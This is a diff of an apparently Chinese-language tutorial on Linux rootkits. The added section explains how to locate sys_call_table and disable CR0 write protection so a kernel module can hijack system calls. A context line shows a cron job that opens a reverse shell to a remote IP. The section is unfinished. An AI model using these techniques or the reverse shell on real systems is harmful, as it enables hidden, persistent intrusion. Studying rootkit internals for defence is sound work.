@@ -70,7 +70,7 @@ echo '*/1 * * * * bash -c "bash -i &> /dev/tcp/192.168.100.100/9999 0>&1"' | cro
 
 rootkit 是隱藏其他程式的技術
 
-### level 0
+### Basic
 
 在 `$PATH` 環境變數中 `/usr/local/bin` 在 `/bin` 前面
 
@@ -86,7 +86,7 @@ rootkit 是隱藏其他程式的技術
 * `grep -Ev` 是 inverse match
 * `$@` 是傳進來的參數 ( 這裡原封不動的交給 `/bin/ps` )
 
-### level 1 - LD_PRELOAD
+### LD_PRELOAD
 
 #### 原始碼
 
@@ -200,9 +200,92 @@ LD_PRELOAD=/path/to/hook.so ps aux
 
 <img src="https://i.imgur.com/pyGjG1j.png" width="700">
 
-### level 2 - Kernel Module
+### Loadable Kernel Module
 
-**==TODO==**
+#### 取得 sys_call_table
+
+首先因為我們要 hijack system call 所以要先取得 `sys_call_table` 的位址
+
+##### 方法一
+
+在 2.4 以前的內核版本，預設導出所有符號，所以可以直接用
+
+```c
+extern void *sys_call_table[];
+```
+
+如果自己編譯內核的話，可以修改原始碼用 `EXPORT_SYMBOL` 把 `sys_call_table` 的符號導出來
+
+##### 方法二
+
+`/boot/System.map-$(uname -r)` 這個檔案記錄了編譯時內核符號的地址，但是這個檔案不保證存在
+
+```bash tab="command"
+grep "sys_call_table" /boot/System.map-$(uname -r)
+```
+
+```bash tab="output"
+ffffffff81e001a0 R sys_call_table
+ffffffff81e01560 R ia32_sys_call_table
+```
+
+##### 方法三
+
+`/proc/kallsyms` 是一個特殊的檔案，會在讀取的時候動態產生，可以參考[/kernel/kallsyms.c#L705](https://elixir.bootlin.com/linux/latest/source/kernel/kallsyms.c#L705)
+
+```bash tab="command"
+cat /proc/kallsyms | grep  "sys_call_table"
+```
+
+```bash tab="output"
+ffffffff92a001a0 R sys_call_table
+ffffffff92a01560 R ia32_sys_call_table
+```
+
+##### 方法四
+
+源自於[這篇](http://phrack.org/issues/58/7.html)
+
+用 `sidt` 這個指令獲取 Interrupt Descriptor Table (IDT) 的位址  
+IDT 上的第 0x80 個欄位存有 `system_call` 的位址  
+`system_call` 裡面的其中一行指令 `call sys_call_table(,eax,4)` 有用到 `sys_call_table`  
+所以在 `system_call` 裡面查找那一行指令的頭三個 byte `\xff\x14\x85`，後面就是我們要的 `sys_call_table`
+
+##### 方法五
+
+使用 `kallsyms_lookup_name`
+
+```c
+#include <linux/kallsyms.h>
+
+static void **sys_call_table;
+
+static int __init hook_init (void) {
+    sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
+    printk(KERN_INFO "sys_call_table = 0x%px\n", sys_call_table);
+    return 0;
+}
+```
+
+??? info "printk a pointer[^6]"
+    要用 printk 印出 pointer 可以用 `%px`  
+    `%p` 只會印出該指標的雜湊值而不是真正的指標的值，這是為了避免洩漏內核位址
+
+#### 讓 `sys_call_table` 可以寫入
+
+因為 `sys_call_table` 是唯讀的，所以我們透過修改 [`cr0`](https://en.wikipedia.org/wiki/Control_register#CR0) 來關閉寫入保護
+
+```c
+void writable_unlock (void) {
+    write_cr0(read_cr0() & (~X86_CR0_WP));
+}
+
+void writable_lock (void) {
+    write_cr0(read_cr0() | X86_CR0_WP);
+}
+```
+
+==**未完待續**==
 
 [^1]:
 	https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab
@@ -210,3 +293,11 @@ LD_PRELOAD=/path/to/hook.so ps aux
 	https://ubuntuforums.org/showthread.php?t=1656623
 [^3]:
 	http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/
+[^4]:
+    https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/
+[^5]:
+    https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html
+[^6]:
+    https://www.kernel.org/doc/Documentation/printk-formats.txt
+[^7]:
+    https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/
